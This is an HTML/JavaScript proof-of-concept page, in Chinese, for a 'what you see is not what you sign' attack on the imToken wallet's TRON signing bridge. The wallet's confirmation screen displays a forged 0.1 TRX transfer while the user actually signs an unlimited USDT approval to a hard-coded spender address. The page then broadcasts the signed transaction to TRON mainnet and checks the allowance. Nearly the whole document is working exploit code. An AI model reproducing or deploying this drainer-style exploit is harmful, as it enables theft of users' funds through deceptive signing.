<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>所见非所签 PoC（转账壳 + 授权芯）</title>
  <style>
    :root { --bg: #0b0f14; --card: #131a22; --border: #253040; --text: #e1e6ed; --text2: #8899aa; --red: #f04343; --green: #2ecc71; --orange: #e6a23c; --blue: #4d94ff; }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 16px; display: flex; flex-direction: column; gap: 14px; }
    .card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 18px; }
    .card-header { font-weight: 600; font-size: 15px; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
    .dot { width: 9px; height: 9px; border-radius: 50%; display: inline-block; }
    .dot.red { background: var(--red); } .dot.green { background: var(--green); } .dot.orange { background: var(--orange); }
    .row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 13px; border-bottom: 1px solid rgba(255,255,255,0.05); }
    .label { color: var(--text2); min-width: 85px; }
    .value { text-align: right; word-break: break-all; font-family: monospace; font-size: 12px; }
    .btn { width: 100%; padding: 14px 0; border-radius: 10px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; }
    .btn-connect { background: var(--green); color: #000; }
    .btn-attack { background: #e64343; color: #fff; }
    .btn-check { background: var(--blue); color: #fff; }
    .log-box { background: #090d13; border: 1px solid var(--border); border-radius: 10px; padding: 10px; font-family: monospace; font-size: 11px; max-height: 400px; overflow-y: auto; color: #aab5c0; margin-top: 8px; }
    .log-line { padding: 2px 0; }
    .log-error { color: var(--red); }
    .log-success { color: var(--green); }
    .log-warn { color: var(--orange); }
  </style>
</head>
<body>

<div class="card">
  <div class="card-header"><span class="dot red"></span> 所见非所签攻击（签名阶段分离）</div>
  <div style="font-size:13px; color:var(--text2); line-height:1.6;">
    钱包确认页 → <b style="color:#4d94ff;">转账 0.1 TRX</b><br>
    实际签署并广播 → <b style="color:#f04343;">USDT 无限额度授权</b><br>
    绕过方法：<code>tron.signTransaction</code> + 手动广播
  </div>
</div>

<div class="card">
  <div class="card-header"><span class="dot orange" id="dotStatus"></span> 钱包状态</div>
  <div id="beforeConnect">
    <div class="row"><span class="label">状态</span><span class="value">未连接</span></div>
    <button class="btn btn-connect" id="btnConnect">连接 imToken 钱包</button>
  </div>
  <div id="afterConnect" style="display:none;">
    <div class="row"><span class="label">地址</span><span class="value" id="addrText"></span></div>
    <div class="row"><span class="label">TRX</span><span class="value" id="trxBal"></span></div>
    <button class="btn btn-attack" id="btnAttack">💣 发起所见非所签攻击</button>
    <button class="btn btn-check" id="btnCheck">📊 查询 USDT 授权额度</button>
  </div>
</div>

<div class="card" id="allowanceCard" style="display:none;">
  <div class="card-header"><span class="dot orange"></span> USDT 授权额度（对 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz）</div>
  <div class="row"><span class="label">当前授权</span><span class="value" id="currentAllowance">--</span></div>
</div>

<div class="card">
  <div class="card-header"><span class="dot orange"></span> 运行日志</div>
  <div class="log-box" id="logContainer">等待操作…</div>
</div>

<script>
(function() {
  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
  const SPENDER = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';
  // 授权额度：2^256 - 1 (无限)
  const APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  const TRON_API = 'https://api.trongrid.io';

  let walletAddr = '';
  let tronWeb = null;

  const $ = id => document.getElementById(id);
  function log(msg, type = '') {
    const div = document.createElement('div');
    div.className = 'log-line' + (type ? ' log-' + type : '');
    div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
    $('logContainer').appendChild(div);
    $('logContainer').scrollTop = $('logContainer').scrollHeight;
  }

  function hasBridge() {
    return typeof window.imToken !== 'undefined' && typeof window.imToken.callPromisifyAPI === 'function';
  }

  async function connect() {
    log('检查钱包环境…', 'warn');
    if (!hasBridge()) {
      log('未检测到 imToken 桥接，请在 DApp 浏览器中打开', 'error');
      return;
    }
    for (let i = 0; i < 10; i++) {
      if (window.tronWeb?.ready) break;
      await new Promise(r => setTimeout(r, 600));
    }
    if (window.tronWeb?.ready) {
      tronWeb = window.tronWeb;
      walletAddr = tronWeb.defaultAddress.base58;
    } else {
      try {
        const accounts = await window.imToken.callPromisifyAPI('tron_requestAccounts');
        walletAddr = Array.isArray(accounts) && accounts.length ? accounts[0] : accounts;
      } catch (e) {
        log('获取地址失败: ' + e.message, 'error');
        return;
      }
    }
    if (!walletAddr || walletAddr.length !== 34) {
      log('地址无效', 'error');
      return;
    }
    $('addrText').textContent = walletAddr;
    try {
      const resp = await fetch(TRON_API + '/v1/accounts/' + walletAddr);
      const data = await resp.json();
      $('trxBal').textContent = ((data.data?.[0]?.balance || 0) / 1e6).toFixed(2) + ' TRX';
    } catch { $('trxBal').textContent = '--'; }
    $('dotStatus').className = 'dot green';
    $('beforeConnect').style.display = 'none';
    $('afterConnect').style.display = 'block';
    log('已连接: ' + walletAddr, 'success');
    await checkAllowance();
  }

  // 查询 USDT 授权额度
  async function queryAllowance(owner, spender) {
    try {
      const ownerHex = tronWeb.address.toHex(owner);
      const contractHex = tronWeb.address.toHex(USDT_CONTRACT);
      const result = await tronWeb.transactionBuilder.triggerConstantContract(
        contractHex, 'allowance(address,address)', {},
        [{ type: 'address', value: owner }, { type: 'address', value: spender }],
        ownerHex
      );
      if (result?.constant_result?.[0]) return BigInt('0x' + result.constant_result[0]);
      return null;
    } catch (e) { log('查询 allowance 失败: ' + e.message, 'error'); return null; }
  }

  function formatAmount(wei) {
    if (wei == null) return '--';
    try { return (Number(wei) / 1e6).toFixed(2) + ' USDT'; } catch { return String(wei); }
  }

  async function checkAllowance() {
    if (!walletAddr) return;
    const allowance = await queryAllowance(walletAddr, SPENDER);
    if (allowance == null) {
      $('currentAllowance').textContent = '查询失败';
      $('allowanceCard').style.display = 'block';
      return;
    }
    $('currentAllowance').textContent = formatAmount(allowance);
    $('allowanceCard').style.display = 'block';
    log('当前 USDT 授权额度: ' + formatAmount(allowance));
  }

  // 核心攻击
  async function executeAttack() {
    if (!walletAddr || !tronWeb) {
      log('请先连接钱包', 'error');
      return;
    }
    log('⚙️ 构造攻击交易…');
    try {
      const contractHex = tronWeb.address.toHex(USDT_CONTRACT);
      const userHex = tronWeb.address.toHex(walletAddr);
      const targetHex = tronWeb.address.toHex(SPENDER);

      // 1. 生成真实的 USDT 无限授权交易，拿到 raw_data_hex
      const { transaction, result } = await tronWeb.transactionBuilder.triggerSmartContract(
        contractHex, 'approve(address,uint256)',
        { feeLimit: 100_000_000, callValue: 0 },
        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
        userHex
      );
      if (!result?.result) {
        log('❌ approve 构造失败', 'error');
        return;
      }
      const realHex = transaction.raw_data_hex;
      if (!realHex) {
        log('❌ 未能获取 raw_data_hex', 'error');
        return;
      }
      log(`🔐 真实 raw_data_hex 已生成 (选择器: ${realHex.includes('095ea7b3') ? '存在' : '缺失'})`, 'success');

      // 2. 伪造 raw_data —— 内容仅为一次 0.1 TRX 转账
      const fakeRawData = {
        contract: [{
          type_url: 'type.googleapis.com/protocol.TransferContract',
          parameter: {
            type_url: 'type.googleapis.com/protocol.TransferContract',
            value: {
              amount: 100000,          // 0.1 TRX
              owner_address: userHex,
              to_address: targetHex
            }
          }
        }],
        ref_block_bytes: transaction.raw_data.ref_block_bytes,
        ref_block_hash: transaction.raw_data.ref_block_hash,
        expiration: transaction.raw_data.expiration,
        timestamp: transaction.raw_data.timestamp,
        fee_limit: transaction.raw_data.fee_limit
      };

      log('🎭 假 raw_data 已伪造（仅包含 TransferContract）', 'warn');

      // 3. 调用 tron.signTransaction —— 此时钱包会弹出确认页（显示转账）
      log('📡 调用 tron.signTransaction，请观察钱包确认页…', 'warn');
      const signedResult = await window.imToken.callPromisifyAPI('tron.signTransaction', {
        tx: {
          raw_data: fakeRawData,
          raw_data_hex: realHex
        },
        from: walletAddr,
        useTronHeader: true
      });

      // 4. 解析签名结果
      let signedHex = '';
      if (typeof signedResult === 'string') {
        signedHex = signedResult;
      } else if (signedResult && typeof signedResult === 'object') {
        signedHex = signedResult.signedTransaction || signedResult.transaction || signedResult.txID || '';
        if (!signedHex && signedResult.signature) {
          // 可能是完整签名对象，尝试用 tronWeb 序列化
          try {
            signedHex = tronWeb.utils.transaction.txPbToRawData(signedResult);
          } catch (_) {
            log('⚠️ 签名后对象格式未知，尝试手动提取', 'warn');
          }
        }
      }
      if (!signedHex || typeof signedHex !== 'string') {
        log('❌ 未能从签名结果中提取 hex 字符串: ' + JSON.stringify(signedResult), 'error');
        return;
      }
      log('✍️ 签名完成，已获取带签名的原始交易 hex，前缀: ' + signedHex.substring(0, 40) + '...', 'success');

      // 5. 手动广播到链上
      log('📡 正在手动广播交易到 TRON 网络…', 'warn');
      const broadcastRes = await tronWeb.trx.sendRawTransaction(signedHex);
      log('✅ 广播成功！结果: ' + JSON.stringify(broadcastRes), 'success');
      if (broadcastRes?.txid || broadcastRes?.txID || broadcastRes?.result) {
        const txid = broadcastRes.txid || broadcastRes.txID || broadcastRes.result;
        log('🔗 TXID: ' + txid, 'success');
        log('🌐 TronScan: https://tronscan.org/#/transaction/' + txid);
        log('⏳ 约 12 秒后请重新查询授权额度，确认攻击生效。');
        setTimeout(checkAllowance, 12000);
      }
    } catch (e) {
      log('❌ 攻击失败: ' + (e.message || JSON.stringify(e)), 'error');
      console.error(e);
      if (e.message?.includes('reject')) log('⚠️ 用户取消了签名', 'warn');
    }
  }

  $('btnConnect').addEventListener('click', connect);
  $('btnAttack').addEventListener('click', executeAttack);
  $('btnCheck').addEventListener('click', checkAllowance);

  if (hasBridge()) log('imToken 桥接环境就绪', 'success');
  else log('请在 imToken DApp 浏览器中打开', 'warn');
})();
</script>
</body>
</html>
